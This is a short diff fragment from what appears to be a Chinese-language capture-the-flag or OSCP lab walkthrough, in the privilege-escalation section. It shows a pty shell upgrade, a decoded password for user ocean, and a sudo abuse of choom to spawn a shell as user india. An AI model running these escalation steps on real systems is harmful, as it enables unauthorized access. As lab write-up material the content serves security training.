@@ -60,4 +60,14 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # 提权
 尝试读取第一个flag读取不到cat /home/ocean/user.txt
 
+```C
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ python translater.py Mb+kzhhdliw+rh+zbfie3w4          
+Mb+kzhhdliw+rh+zbfie3w4
+ny password is ayurv3d4
+```
 
+```C
+su ocean
+sudo -u india /usr/bin/choom -n 0 /bin/sh
+```
